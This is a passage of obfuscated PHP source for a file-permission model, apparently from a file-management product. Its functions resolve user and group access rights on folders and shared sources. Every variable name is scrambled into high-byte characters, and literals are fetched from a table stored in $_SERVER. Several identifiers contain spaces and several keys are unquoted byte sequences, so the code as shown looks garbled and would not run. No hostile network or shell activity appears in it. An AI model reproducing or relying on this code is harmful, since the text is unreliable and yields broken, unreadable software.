$Ü´½Ä’¿[$ß÷ßàÇ–[$Ä’Öô­ï[194]]]; if (!$æë…‰ƒ) { continue; } $ß÷ßàÇ–[$Ä’Öô­ï[2183]] = $this->authTargetInfo($æë…‰ƒ); $ß÷ßàÇ–[$Ä’Öô­ï[595]] = rtrim($ß÷ßàÇ–[$Ä’Öô­ï[601]], $Ä’Öô­ï[8]) . $Ä’Öô­ï[8] . ltrim($ß÷ßàÇ–[$Ä’Öô­ï[595]], $Ä’Öô­ï[8]); $ÊøÌƒ˜Ç[] = $ß÷ßàÇ–; $Ó–£ó’„ = count(explode($Ä’Öô­ï[8], trim($ß÷ßàÇ–[$Ä’Öô­ï[595]], $Ä’Öô­ï[8]))); $õûßŠ‹ú[] = $Ó–£ó’„ + ($ß÷ßàÇ–[$Ä’Öô­ï[33]] == $Ä’Öô­ï[78] ? 0 : 1000); } array_multisort($õûßŠ‹ú, SORT_ASC, $ÊøÌƒ˜Ç); return $ÊøÌƒ˜Ç; } private function groupChidldAllRootSource($²» öü) { $ªòé¢ºÅ =& $_SERVER[®»±”ó²]; $¯Üõ¥Òû = Model($ªòé¢ºÅ[1400])->groupChildrenAll($²» öü); $×ï¿…Î = array($ªòé¢ºÅ[193] => 0, $ªòé¢ºÅ[582] => array($ªòé¢ºÅ[7], $¯Üõ¥Òû), $ªòé¢ºÅ[191] => SourceModel::TYPE_GROUP); $öìôÃ† = Model($ªòé¢ºÅ[911])->field($ªòé¢ºÅ[194])->where($×ï¿…Î)->select(); $öìôÃ† = array_to_keyvalue($öìôÃ†, $ªòé¢ºÅ[12], $ªòé¢ºÅ[194]); return $öìôÃ†; } private function authTargetInfo($ûËÌ»³¤) { $É«ÉŠî =& $_SERVER[®»±”ó²]; $ëÍ¡ÂòŞ = array(); $„ÌáÄÜƒ = array(); $ÅÛõí„¥ = 2 << 25; foreach ($ûËÌ»³¤ as $ëÓúÂÉ) { $ºÄô™„¦ = Model($É«ÉŠî[584])->listData($ëÓúÂÉ[$É«ÉŠî[2100]]); if (!$ºÄô™„¦) { continue; } if ($ëÓúÂÉ[$É«ÉŠî[191]] == SourceModel::TYPE_USER) { $¼°å† = Model($É«ÉŠî[590])->getInfoSimpleOuter($ëÓúÂÉ[$É«ÉŠî[582]]); if ($¼°å†[$É«ÉŠî[1791]] == $É«ÉŠî[1285]) { continue; } if ($¼°å†[$É«ÉŠî[1791]] == $É«ÉŠî[231]) { $¼°å†[$É«ÉŠî[32]] = LNG($É«ÉŠî[2184]); } } else { $¼°å† = Model($É«ÉŠî[598])->getInfoSimple($ëÓúÂÉ[$É«ÉŠî[582]]); } if (!$¼°å†) { continue; } $¼°å†[$É«ÉŠî[553]] = $ºÄô™„¦; $ëÍ¡ÂòŞ[] = $¼°å†; $½ÄÄÂ‡¦ = 0; if ($ëÓúÂÉ[$É«ÉŠî[191]] == SourceModel::TYPE_GROUP) { $½ÄÄÂ‡¦ = $ÅÛõí„¥ * 2; } if ($ëÓúÂÉ[$É«ÉŠî[191]] == SourceModel::TYPE_USER) { $½ÄÄÂ‡¦ = $ÅÛõí„¥; } if ($ëÓúÂÉ[$É«ÉŠî[191]] == SourceModel::TYPE_USER && $ëÓúÂÉ[$É«ÉŠî[582]] == $É«ÉŠî[231]) { $½ÄÄÂ‡¦ = 0; } $„ÌáÄÜƒ[] = $ºÄô™„¦[$É«ÉŠî[498]] + $½ÄÄÂ‡¦; } array_multisort($„ÌáÄÜƒ, SORT_DESC, $ëÍ¡ÂòŞ); return $ëÍ¡ÂòŞ; } public function getAllChildrenByUser($Ò×”¤š, $ß‹‰“µÛ) { $ÔÉ¨£üâ =& $_SERVER[®»±”ó²]; $Ìş¾È¨ = Model($ÔÉ¨£üâ[610])->getInfo($ß‹‰“µÛ); if (!$ß‹‰“µÛ || !$Ò×”¤š || !$Ìş¾È¨) { return array(); } $Í¢º£æç = Model($ÔÉ¨£üâ[1440])->sourceInfo($Ò×”¤š); $ì‚ãö¹Š = array(); $­ŸÄƒèÃ = 1; if ($Í¢º£æç[$ÔÉ¨£üâ[193]] == $ÔÉ¨£üâ[231] && $Í¢º£æç[$ÔÉ¨£üâ[582]] != $­ŸÄƒèÃ && $this->groupContainUser($Í¢º£æç[$ÔÉ¨£üâ[582]], $ß‹‰“µÛ)) { foreach ($Ìş¾È¨[$ÔÉ¨£üâ[1401]] as $ğ¢í”à…) { $ÌúÄÁÇ… = Model($ÔÉ¨£üâ[598])->getInfo($ğ¢í”à…[$ÔÉ¨£üâ[1402]]); $äù¡¥¡¹ = Model($ÔÉ¨£üâ[610])->getInfoSimpleOuter($ß‹‰“µÛ); $äù¡¥¡¹[$ÔÉ¨£üâ[553]] = $ğ¢í”à…[$ÔÉ¨£üâ[498]]; if (Model($ÔÉ¨£üâ[584])->authCheckAction($ğ¢í”à…[$ÔÉ¨£üâ[498]][$ÔÉ¨£üâ[498]], $ÔÉ¨£üâ[2012])) { continue; } $ˆ†ÉÔ… = array($ÔÉ¨£üâ[32] => $ÔÉ¨£üâ[1305] . $ÌúÄÁÇ…[$ÔÉ¨£üâ[32]], $ÔÉ¨£üâ[194] => $ÌúÄÁÇ…[$ÔÉ¨£üâ[90]][$ÔÉ¨£üâ[194]], $ÔÉ¨£üâ[87] => KodIO::make($ÌúÄÁÇ…[$ÔÉ¨£üâ[90]][$ÔÉ¨£üâ[194]]), $ÔÉ¨£üâ[193] => $ÔÉ¨£üâ[231], $ÔÉ¨£üâ[191] => $ÔÉ¨£üâ[591], $ÔÉ¨£üâ[33] => $ÔÉ¨£üâ[632], $ÔÉ¨£üâ[595] => $ÌúÄÁÇ…[$ÔÉ¨£üâ[602]], $ÔÉ¨£üâ[1402] => $ÌúÄÁÇ…[$ÔÉ¨£üâ[1402]], $ÔÉ¨£üâ[599] => $ÌúÄÁÇ…[$ÔÉ¨£üâ[193]], $ÔÉ¨£üâ[2183] => array($äù¡¥¡¹)); $ì‚ãö¹Š[$ˆ†ÉÔ…[$ÔÉ¨£üâ[194]]] = $ˆ†ÉÔ…; } } $á¹äšøÖ = array(); $œòï´¾š = $this->getAllChildren($Ò×”¤š); foreach ($œòï´¾š as $¶şÀÇÚ«) { $“•˜¨Áó = !1; foreach ($¶şÀÇÚ«[$ÔÉ¨£üâ[2183]] as $—“÷ƒÒš) { if ($—“÷ƒÒš[$ÔÉ¨£üâ[1791]]) { if ($—“÷ƒÒš[$ÔÉ¨£üâ[1791]] == $ß‹‰“µÛ) { $“•˜¨Áó = !0; break; } } if ($—“÷ƒÒš[$ÔÉ¨£üâ[1402]]) { if ($this->groupContainUser($—“÷ƒÒš[$ÔÉ¨£üâ[1402]], $ß‹‰“µÛ)) { $“•˜¨Áó = !0; break; } } } if ($“•˜¨Áó) { $á¹äšøÖ[] = $¶şÀÇÚ«; } $Ş‰˜© ‚ = $¶şÀÇÚ«[$ÔÉ¨£üâ[194]]; if (isset($ì‚ãö¹Š[$Ş‰˜© ‚])) { $¶şÀÇÚ«[$ÔÉ¨£üâ[2183]][] = $ì‚ãö¹Š[$Ş‰˜© ‚][0]; $ì‚ãö¹Š[$Ş‰˜© ‚] = !1; } } $ì‚ãö¹Š = array_filter(array_values($ì‚ãö¹Š)); $á¹äšøÖ = array_merge($ì‚ãö¹Š, $á¹äšøÖ); return $á¹äšøÖ; } public function setAllChildrenByUser($„åÃÛÚõ, $ÎÖ¤äİÏ, $Ğ¨ìšº) { $ÃäÀ¡É =& $_SERVER[®»±”ó²]; $Œã¨¨º» = $this->getAllChildrenByUser($„åÃÛÚõ, $ÎÖ¤äİÏ); if (!$Ğ¨ìšº || !$Œã¨¨º») { return !1; } foreach ($Œã¨¨º» as $Ÿ½ººè) { $…Ç®¯•Ü = array(); foreach ($Ÿ½ººè[$ÃäÀ¡É[2183]] as $ÅÖ’££Å) { $í¶ªŒÑ = $ÅÖ’££Å[$ÃäÀ¡É[553]]; $Ÿ²å ˆ‰ = $ÅÖ’££Å[$ÃäÀ¡É[1791]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‚®ñú‚’ = $ÅÖ’££Å[$ÃäÀ¡É[1791]] ? $ÅÖ’££Å[$ÃäÀ¡É[1791]] : $ÅÖ’££Å[$ÃäÀ¡É[1402]]; if ($ÅÖ’££Å[$ÃäÀ¡É[1791]] && $ÅÖ’££Å[$ÃäÀ¡É[1791]] == $ÎÖ¤äİÏ) { continue; } $…Ç®¯•Ü[] = array($ÃäÀ¡É[194] => $Ÿ½ººè[$ÃäÀ¡É[194]], $ÃäÀ¡É[191] => $Ÿ²å ˆ‰, $ÃäÀ¡É[582] => intval($‚®ñú‚’), $ÃäÀ¡É[2100] => isset($í¶ªŒÑ[$ÃäÀ¡É[477]]) ? intval($í¶ªŒÑ[$ÃäÀ¡É[477]]) : 0, $ÃäÀ¡É[2163] => isset($í¶ªŒÑ[$ÃäÀ¡É[2163]]) ? intval($í¶ªŒÑ[$ÃäÀ¡É[2163]]) : -1); } $…Ç®¯•Ü[] = array($ÃäÀ¡É[194] => $Ÿ½ººè[$ÃäÀ¡É[194]], $ÃäÀ¡É[191] => SourceModel::TYPE_USER, $ÃäÀ¡É[582] => intval($ÎÖ¤äİÏ), $ÃäÀ¡É[2100] => intval($Ğ¨ìšº), $ÃäÀ¡É[2163] => -1); $this->where(array($ÃäÀ¡É[502] => $Ÿ½ººè[$ÃäÀ¡É[194]]))->delete(); $this->addAll($…Ç®¯•Ü); } return !0; } public function get($¶÷ÛêŒ) { $´Š¾¡‹Ş = $this->getSourceList(array($¶÷ÛêŒ), !0); return $´Š¾¡‹Ş[0]; } public function getSourceList($Öé‹åŠä, $Ú”Å¦•Õ = false, $Úù»¬Ñ° = false) { $Àõ’§¨Ë =& $_SERVER[®»±”ó²]; if (!$Öé‹åŠä) { return array(); } $åÅª­ò… = Model($Àõ’§¨Ë[1440]); if (!$Ú”Å¦•Õ && count($Öé‹åŠä) == 1) { $Ú”Å¦•Õ = array(); $Ú”Å¦•Õ[$Öé‹åŠä[0]] = $åÅª­ò…->sourceInfo($Öé‹åŠä[0]); } if (!$Ú”Å¦•Õ) { $í²ü…ï“ = array($Àõ’§¨Ë[502] => array($Àõ’§¨Ë[503], $Öé‹åŠä)); $Ú”Å¦•Õ = $åÅª­ò…->field($Àõ’§¨Ë[2185])->where($í²ü…ï“)->select(); $Ú”Å¦•Õ = array_to_keyvalue($Ú”Å¦•Õ, $Àõ’§¨Ë[194]); } $„¼ÕŸï = $Öé‹åŠä; foreach ($Ú”Å¦•Õ as $šÜíåã => $ƒÄûü) { $…÷ø•ú‘ = $åÅª­ò…->parentLevelArray($ƒÄûü[$Àõ’§¨Ë[597]]); $„¼ÕŸï = array_merge($„¼ÕŸï, array($šÜíåã), array_reverse($…÷ø•ú‘)); } $„¼ÕŸï = array_values(array_unique($„¼ÕŸï)); if (!$„¼ÕŸï) { return array(); } $µâ°šÕ’ = $this->sourceAuthSelect($„¼ÕŸï); $á·ü¼ó = array(); foreach ($„¼ÕŸï as $İ“Üœ¨ü) { if (isset($µâ°šÕ’[$İ“Üœ¨ü])) { $á·ü¼ó[$İ“Üœ¨ü] = $µâ°šÕ’[$İ“Üœ¨ü]; } } $Íı«Ååã = $this->userIsRoot($Úù»¬Ñ°); $”™¡Ü…Õ = AuthModel::authAll(); $’ÄÃĞòá = array($Àõ’§¨Ë[499] => $”™¡Ü…Õ, $Àõ’§¨Ë[2186] => array($Àõ’§¨Ë[504] => 0, $Àõ’§¨Ë[1997] => $”™¡Ü…Õ, $Àõ’§¨Ë[505] => LNG($Àõ’§¨Ë[2187]), $Àõ’§¨Ë[2014] => $Àõ’§¨Ë[2188])); $°¡íæœ™ = array(); foreach ($Ú”Å¦•Õ as $İ“Üœ¨ü => $ŒÃşÎò“) { if ($Íı«Ååã && $GLOBALS[$Àõ’§¨Ë[6]][$Àõ’§¨Ë[2010]]) { $°¡íæœ™[$İ“Üœ¨ü] = $’ÄÃĞòá; continue; } $°¡íæœ™[$İ“Üœ¨ü] = $this->makeSourceAuth($ŒÃşÎò“, $á·ü¼ó, $Úù»¬Ñ°); } return $°¡íæœ™; } public function authDeepCheck($µ³ØÕÈÀ, $„ÙšÛÛ = false) { $ãÒ–ú¸¿ =& $_SERVER[®»±”ó²]; $„ÙšÛÛ = $„ÙšÛÛ ? $„ÙšÛÛ : USER_ID; $ğ÷ı¾Ç™ = $this->makeAuthDeep($„ÙšÛÛ); if (!in_array($µ³ØÕÈÀ, $ğ÷ı¾Ç™[$ãÒ–ú¸¿[2189]])) { return !1; } $â©êŠå = array(); foreach ($ğ÷ı¾Ç™[$ãÒ–ú¸¿[2190]] as $¸“ã Ã => $³«İšÅ) { if (!in_array($µ³ØÕÈÀ, $³«İšÅ)) { continue; } $â©êŠå[] = $¸“ã Ã; } if (!$â©êŠå) { return !1; } $§ù®ÔŸ = $â©êŠå ? $â©êŠå[0] : $µ³ØÕÈÀ; return array($ãÒ–ú¸¿[499] => -1, $ãÒ–ú¸¿[553] => array($ãÒ–ú¸¿[504] => $ãÒ–ú¸¿[1285], $ãÒ–ú¸¿[1997] => $ãÒ–ú¸¿[231], $ãÒ–ú¸¿[505] => LNG($ãÒ–ú¸¿[2191]), $ãÒ–ú¸¿[2014] => $ãÒ–ú¸¿[2192]), $ãÒ–ú¸¿[2193] => LNG($ãÒ–ú¸¿[2194]), $ãÒ–ú¸¿[2195] => $this->sourceAuthInfo($§ù®ÔŸ)); } protected function makeAuthDeep($Š°èÀ•ì = false) { $Ã¶Ä°éÉ =& $_SERVER[®»±”ó²]; static $Æ€şá«© = array(); $Š°èÀ•ì = $Š°èÀ•ì ? $Š°èÀ•ì : USER_ID; if (isset($Æ€şá«©[$Š°èÀ•ì])) { return $Æ€şá«©[$Š°èÀ•ì]; } $††»½“ú = Model($Ã¶Ä°éÉ[2196])->listData(); $ÅöÏµŞÚ = array(); foreach ($††»½“ú as $úéì‡öã) { if ($úéì‡öã[$Ã¶Ä°éÉ[498]] == 0 && $úéì‡öã[$Ã¶Ä°éÉ[2013]] == $Ã¶Ä°éÉ[91]) { $ÅöÏµŞÚ[] = $úéì‡öã[$Ã¶Ä°éÉ[477]]; } } $¤Æ¨Æˆì = $this->userGroupParents($Š°èÀ•ì); $¾êâ‹Á = array($Ã¶Ä°éÉ[191] => SourceModel::TYPE_USER, $Ã¶Ä°éÉ[582] => $Š°èÀ•ì); if ($¤Æ¨Æˆì) { $¾êâ‹Á = array(array($Ã¶Ä°éÉ[191] => SourceModel::TYPE_USER, $Ã¶Ä°éÉ[582] => $Š°èÀ•ì), array($Ã¶Ä°éÉ[191] => SourceModel::TYPE_GROUP, $Ã¶Ä°éÉ[582] => array($Ã¶Ä°éÉ[503], $¤Æ¨Æˆì)), $Ã¶Ä°éÉ[1087] => $Ã¶Ä°éÉ[2094]); } $÷’æù¯¾ = $this->field($Ã¶Ä°éÉ[2197])->where($¾êâ‹Á)->select(); $‰æ­ä¨ = array(); $ç Ö•‰Ó = array_to_keyvalue_group($÷’æù¯¾, $Ã¶Ä°éÉ[194]); foreach ($ç Ö•‰Ó as $ë’¶°Ûç => $²È©Üü”) { $ù‡İ‘É› = $this->authArrayCheck($²È©Üü”, $Š°èÀ•ì); if ($ù‡İ‘É›[$Ã¶Ä°éÉ[499]] > 0) { $‰æ­ä¨[] = $ë’¶°Ûç . $Ã¶Ä°éÉ[12]; } } if ($¤Æ¨Æˆì) { $²€¿ÒÍ… = Model($Ã¶Ä°éÉ[598]); foreach ($¤Æ¨Æˆì as $ƒô´İÀÔ) { $Í¥³¬Óß = $²€¿ÒÍ…->getInfo($ƒô´İÀÔ); if (!$Í¥³¬Óß || !is_array($Í¥³¬Óß[$Ã¶Ä°éÉ[90]])) { continue; } $‰æ­ä¨[] = $Í¥³¬Óß[$Ã¶Ä°éÉ[90]][$Ã¶Ä°éÉ[194]]; } } $Ô£¥†„ = array(); $¶üÓÆƒº = $¤Æ¨Æˆì; $Ùµ¹‰½Û = Model($Ã¶Ä°éÉ[1440]); $²€¿ÒÍ… = Model($Ã¶Ä°éÉ[598]); $äÃÛ®â¥ = array(); $Í»áÕˆù = array(); $åÜ‰ÄµÀ = array(); $¦û¬¡’» = array(); if ($‰æ­ä¨) { $©ƒÁ±Á = $Ùµ¹‰½Û->where(array($Ã¶Ä°éÉ[194] => array($Ã¶Ä°éÉ[503], $‰æ­ä¨)))->select(); foreach ($©ƒÁ±Á as $ß÷µÜŞ—) { if ($ß÷µÜŞ—[$Ã¶Ä°éÉ[516]] == $Ã¶Ä°éÉ[91]) { continue; } $°„†É®¯ = $Ùµ¹‰½Û->parentLevelArray($ß÷µÜŞ—[$Ã¶Ä°éÉ[597]]); $Ô£¥†„ = array_merge($Ô£¥†„, $°„†É®¯); $¶üÓÆƒº[] = $ß÷µÜŞ—[$Ã¶Ä°éÉ[582]]; $äÃÛ®â¥[$ß÷µÜŞ—[$Ã¶Ä°éÉ[194]]] = $°„†É®¯; $Í»áÕˆù[$ß÷µÜŞ—[$Ã¶Ä°éÉ[194]]] = $ß÷µÜŞ—[$Ã¶Ä°éÉ[582]]; } } $¶üÓÆƒº = array_values(array_unique($¶üÓÆƒº)); $éÃã»Ì” = $¶üÓÆƒº; foreach ($éÃã»Ì” as $ƒô´İÀÔ) { $Í¥³¬Óß = $²€¿ÒÍ…->getInfo($ƒô´İÀÔ); $°„†É®¯ = $Ùµ¹‰½Û->parentLevelArray($Í¥³¬Óß[$Ã¶Ä°éÉ[597]]); $¶üÓÆƒº = array_merge($¶üÓÆƒº, $°„†É®¯); } $¶üÓÆƒº = array_values(array_unique($¶üÓÆƒº)); foreach ($¶üÓÆƒº as $ƒô´İÀÔ) { $Í¥³¬Óß = $²€¿ÒÍ…->getInfo($ƒô´İÀÔ); $Ô£¥†„[] = $Í¥³¬Óß[$Ã¶Ä°éÉ[90]][$Ã¶Ä°éÉ[194]]; $åÜ‰ÄµÀ[$ƒô´İÀÔ] = $Í¥³¬Óß[$Ã¶Ä°éÉ[90]][$Ã¶Ä°éÉ[194]]; $¦û¬¡’»[$ƒô´İÀÔ] = $Ùµ¹‰½Û->parentLevelArray($Í¥³¬Óß[$Ã¶Ä°éÉ[597]]); } foreach ($äÃÛ®â¥ as $…—Ü÷î => $Ğø¦ÎÑ) { $å¤ıàõğ = $Í»áÕˆù[$…—Ü÷î]; if (!$å¤ıàõğ || !$åÜ‰ÄµÀ[$å¤ıàõğ]) { continue; } $™ŒÙé“ = array(); foreach ($¦û¬¡’»[$å¤ıàõğ] as $ƒô´İÀÔ) { $™ŒÙé“[] = $åÜ‰ÄµÀ[$ƒô´İÀÔ]; } $äÃÛ®â¥[$…—Ü÷î] = array_merge($™ŒÙé“, $Ğø¦ÎÑ); } $Ô£¥†„ = array_values(array_unique($Ô£¥†„)); $øÙå•šş = array($Ã¶Ä°éÉ[2189] => $Ô£¥†„, $Ã¶Ä°éÉ[2190] => $äÃÛ®â¥); $Æ€şá«©[$Š°èÀ•ì] = $øÙå•šş; return $øÙå•šş; } private function makeSourceAuth($°¿ÆşÁ, $–¨Ùë©±, $Ê£ªüÁü = false) { $ğí˜€¿ë =& $_SERVER[®»±”ó²]; $¬†®µ¤­ = $ğí˜€¿ë[91]; $…ğ†œæÍ = $°¿ÆşÁ[$ğí˜€¿ë[582]]; $îĞûÂ·¤ = $°¿ÆşÁ[$ğí˜€¿ë[191]] == SourceModel::TYPE_GROUP; $ëÃµŸşÔ = $îĞûÂ·¤ ? $this->groupRootAuth($…ğ†œæÍ, $Ê£ªüÁü) : !1; if ($ëÃµŸşÔ && Model($ğí˜€¿ë[584])->authCheckAction($ëÃµŸşÔ[$ğí˜€¿ë[498]], $ğí˜€¿ë[2012])) { return $this->groupAuthInfo($ëÃµŸşÔ, $…ğ†œæÍ); } $ëòâÃ = Model($ğí˜€¿ë[1440])->parentLevelArray($°¿ÆşÁ[$ğí˜€¿ë[597]]); $ëòâÃ = array_merge(array($°¿ÆşÁ[$ğí˜€¿ë[194]]), array_reverse($ëòâÃ)); $‘ÔÌß£Ï = !1; foreach ($ëòâÃ as $–¦½…ú¹) { if (!isset($–¨Ùë©±[$–¦½…ú¹])) { continue; } $›Éœ­œã = $this->authMake($–¨Ùë©±[$–¦½…ú¹], $Ê£ªüÁü); if ($›Éœ­œã[$ğí˜€¿ë[553]]) { $‘ÔÌß£Ï = $›Éœ­œã; break; } } if (!$îĞûÂ·¤) { return $‘ÔÌß£Ï; } if (!$‘ÔÌß£Ï && $ëÃµŸşÔ) { $‘ÔÌß£Ï = $this->groupAuthInfo($ëÃµŸşÔ, $…ğ†œæÍ); } if (!$‘ÔÌß£Ï) { $åÉ¹Ãö³ = Model($ğí˜€¿ë[598])->getInfo($…ğ†œæÍ); $êË‘îûÃ = explode($ğí˜€¿ë[50], trim($åÉ¹Ãö³[$ğí˜€¿ë[597]], $ğí˜€¿ë[50])); $êË‘îûÃ = array_reverse($êË‘îûÃ); foreach ($êË‘îûÃ as $Œºº Çş) { if ($Œºº Çş == $ğí˜€¿ë[231] || $Œºº Çş == $¬†®µ¤­) { continue; } $Ùò»¦  = $this->groupRootAuth($Œºº Çş, $Ê£ªüÁü); if (!$Ùò»¦ ) { continue; } $‘ÔÌß£Ï = $this->groupAuthInfo($Ùò»¦ , $Œºº Çş); break; } } if (!$‘ÔÌß£Ï || $‘ÔÌß£Ï[$ğí˜€¿ë[499]] <= 0) { $éú´Ãª° = $this->authDeepCheck($°¿ÆşÁ[$ğí˜€¿ë[194]], $Ê£ªüÁü); if ($éú´Ãª°) { $‘ÔÌß£Ï = $éú´Ãª°; } } return $‘ÔÌß£Ï; } private function userIsRoot($«óÍ“½ = false) { $Ğ«¥á“¯ =& $_SERVER[®»±”ó²]; if (!$«óÍ“½ && KodUser::isRoot()) { return !0; } $´òòõ«ò = Model($Ğ«¥á“¯[610])->getInfo($«óÍ“½); $¼ø¯…ùß = Model($Ğ«¥á“¯[2198])->listData($´òòõ«ò[$Ğ«¥á“¯[2199]]); if ($¼ø¯…ùß && $¼ø¯…ùß[$Ğ«¥á“¯[588]][$Ğ«¥á“¯[2200]] == 1) { return !0; } return !1; } private function sourceAuthInfo($üî®íÊŠ) { $ö¹‡£’¤ =& $_SERVER[®»±”ó²]; $Ú„¨ñô³ = Model($ö¹‡£’¤[1440]); $µ³Á¥ãà = $Ú„¨ñô³->sourceInfo($üî®íÊŠ); if (!$µ³Á¥ãà) { return !1; } $Ú„¨ñô³->groupPathDisplay($µ³Á¥ãà); $¹û¡±ÖÄ = array($µ³Á¥ãà); $¹û¡±ÖÄ = $Ú„¨ñô³->_listAppendPath($¹û¡±ÖÄ); $µ³Á¥ãà = $¹û¡±ÖÄ[0]; $—úÑ— = $µ³Á¥ãà[$ö¹‡£’¤[595]]; if (isset($µ³Á¥ãà[$ö¹‡£’¤[603]])) { $‚æÜÓ¯‡ = explode($ö¹‡£’¤[8], trim($µ³Á¥ãà[$ö¹‡£’¤[595]], $ö¹‡£’¤[8])); array_shift($‚æÜÓ¯‡); $—úÑ— = $µ³Á¥ãà[$ö¹‡£’¤[601]] . $ö¹‡£’¤[2201] . implode($ö¹‡£’¤[8], $‚æÜÓ¯‡); } return array($ö¹‡£’¤[505] => $µ³Á¥ãà[$ö¹‡£’¤[32]], $ö¹‡£’¤[87] => KodIO::make($µ³Á¥ãà[$ö¹‡£’¤[194]]), $ö¹‡£’¤[2202] => $—úÑ—); } private function groupAuthInfo($±ĞÚ€Àá, $¾‡ĞÈÒ) { $âĞ¶½ € =& $_SERVER[®»±”ó²]; $Ìçû’Â˜ = Model($âĞ¶½ €[598])->getInfo($¾‡ĞÈÒ); return array($âĞ¶½ €[2203] => intval($±ĞÚ€Àá[$âĞ¶½ €[498]]), $âĞ¶½ €[2186] => $±ĞÚ€Àá, $âĞ¶½ €[2204] => LNG($âĞ¶½ €[2205]), $âĞ¶½ €[2195] => array($âĞ¶½ €[505] => $Ìçû’Â˜[$âĞ¶½ €[32]], $âĞ¶½ €[87] => KodIO::make($Ìçû’Â˜[$âĞ¶½ €[90]][$âĞ¶½ €[194]]), $âĞ¶½ €[2202] => $Ìçû’Â˜[$âĞ¶½ €[602]])); } protected function groupRootAuth($³£ùŞŠï, $ò€·Ã€œ = false) { $ÈŒæ–Æù =& $_SERVER[®»±”ó²]; $ò€·Ã€œ = $ò€·Ã€œ ? $ò€·Ã€œ : USER_ID; $“ã¤—âò = $ò€·Ã€œ . $ÈŒæ–Æù[2206] . $³£ùŞŠï; static $ŠÙğĞŠµ = array(); if (isset($ŠÙğĞŠµ[$“ã¤—âò])) { return $ŠÙğĞŠµ[$“ã¤—âò]; } $ÉÆ·Ë¥Œ = Model($ÈŒæ–Æù[598])->getInfo($³£ùŞŠï); $ÆŠçÉ¹ = $this->userGroupList($ò€·Ã€œ); $ÍÇ×ğÔâ = isset($ÆŠçÉ¹[$³£ùŞŠï]) ? $ÆŠçÉ¹[$³£ùŞŠï][$ÈŒæ–Æù[498]] : !1; if ($ÍÇ×ğÔâ && Model($ÈŒæ–Æù[584])->authCheckAction($ÍÇ×ğÔâ[$ÈŒæ–Æù[498]], $ÈŒæ–Æù[2012])) { $ŠÙğĞŠµ[$“ã¤—âò] = $ÍÇ×ğÔâ; return $ÍÇ×ğÔâ; } $›‡Ä›šÀ = $this->sourceAuthSelect($ÉÆ·Ë¥Œ[$ÈŒæ–Æù[90]][$ÈŒæ–Æù[194]]); $éıöÀÑù = $›‡Ä›šÀ ? $this->authMake($›‡Ä›šÀ, $ò€·Ã€œ) : !1; $ëØå³‡… = $éıöÀÑù ? $éıöÀÑù[$ÈŒæ–Æù[553]] : !1; $ŠÙğĞŠµ[$“ã¤—âò] = $ëØå³‡… ? $ëØå³‡… : $ÍÇ×ğÔâ; return $ŠÙğĞŠµ[$“ã¤—âò]; } public function authOwnerApply($ß’Öè¿«) { $ãôÜ¹©ş =& $_SERVER[®»±”ó²]; if (empty($ß’Öè¿«[$ãôÜ¹©ş[498]]) || isset($ß’Öè¿«[$ãôÜ¹©ş[2207]]) && $ß’Öè¿«[$ãôÜ¹©ş[2207]]) { return $ß’Öè¿«; } if (AuthModel::authCheckRoot($ß’Öè¿«[$ãôÜ¹©ş[498]][$ãôÜ¹©ş[499]])) { return $ß’Öè¿«; } $ŒèâÆ¤› = Model($ãôÜ¹©ş[1440])->parentLevelArray($ß’Öè¿«[$ãôÜ¹©ş[597]]); $ŒèâÆ¤› = array_merge(array($ß’Öè¿«[$ãôÜ¹©ş[194]]), array_reverse($ŒèâÆ¤›)); $‚ßòÏà = $this->sourceAuthSelect($ŒèâÆ¤›); $€ˆ¿‰æá = array(); $õ åªç— = array(); foreach ($‚ßòÏà as $çûÒºÍ² => $ÏÑİ°ã¼) { $ø¨ø—ö = $this->authFolderOwnerUser($ÏÑİ°ã¼); $€ˆ¿‰æá[$çûÒºÍ²] = $ø¨ø—ö; $õ åªç— = array_merge($õ åªç—, $ø¨ø—ö[$ãôÜ¹©ş[678]]); if ($ø¨ø—ö[$ãôÜ¹©ş[2208]]) { break; } } if (count($õ åªç—) == 0) { $õ åªç— = $this->authFolderOwnerGroup($ß’Öè¿«[$ãôÜ¹©ş[582]]); } $õ åªç— = array_unique($õ åªç—); if (AuthModel::authCheckRoot($ß’Öè¿«[$ãôÜ¹©ş[498]][$ãôÜ¹©ş[499]])) { $õ åªç—[] = USER_ID; } $ß’Öè¿«[$ãôÜ¹©ş[498]][$ãôÜ¹©ş[2209]] = Model($ãôÜ¹©ş[590])->userListInfo($õ åªç—); return $ß’Öè¿«; } private function authFolderOwnerGroup($å«¤†¿») { $Ğ¶—ÛÇÄ =& $_SERVER[®»±”ó²]; $²—ı½› = Model($Ğ¶—ÛÇÄ[2086])->where(array($Ğ¶—ÛÇÄ[1402] => $å«¤†¿»))->select(); $ã˜‘è÷ = array(); if (!$²—ı½›) { return $ã˜‘è÷; } foreach ($²—ı½› as $…ş›ŠË‘) { $Î’ªÅ† = $this->authInfo($…ş›ŠË‘); if (AuthModel::authCheckRoot($Î’ªÅ†[$Ğ¶—ÛÇÄ[498]])) { $ã˜‘è÷[] = $…ş›ŠË‘[$Ğ¶—ÛÇÄ[1791]]; } } return $ã˜‘è÷; } private function authFolderOwnerUser($±Ë¼ÜÈÍ) { $«”ù®Úä =& $_SERVER[®»±”ó²]; $íŞñÔ¹ = array(); $Ì„ìñÚ— = !1; foreach ($±Ë¼ÜÈÍ as $óµŸ–Áİ) { $¸øÛ±Š = $this->authInfo($óµŸ–Áİ); if ($óµŸ–Áİ[$«”ù®Úä[582]] == $«”ù®Úä[231]) { $Ì„ìñÚ— = !0; } if ($óµŸ–Áİ[$«”ù®Úä[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¸øÛ±Š[$«”ù®Úä[498]])) { $íŞñÔ¹[] = $óµŸ–Áİ[$«”ù®Úä[582]]; } } } return array($«”ù®Úä[678] => $íŞñÔ¹, $«”ù®Úä[2208] => $Ì„ìñÚ—); } public function authMake($’ë½ä´Ó, $¹Ç´¤á = false) { $Æ¹îÍê =& $_SERVER[®»±”ó²]; $²üâ˜˜ = $this->authArrayCheck($’ë½ä´Ó, $¹Ç´¤á); if ($²üâ˜˜[$Æ¹îÍê[2210]]) { $²üâ˜˜[$Æ¹îÍê[2210]] = $this->sourceAuthInfo($²üâ˜˜[$Æ¹îÍê[2210]]); } return $²üâ˜˜; } public function authArrayCheck($ú……¥ç, $ŞÄšğí· = false) { $¡İüÑ–ı =& $_SERVER[®»±”ó²]; if (!$ú……¥ç) { return array($¡İüÑ–ı[499] => 0, $¡İüÑ–ı[553] => !1); } $ŞÄšğí· = $ŞÄšğí· ? $ŞÄšğí· : USER_ID; $öÛµ¢ƒÓ = 0; $½í§ê¹  = 0; 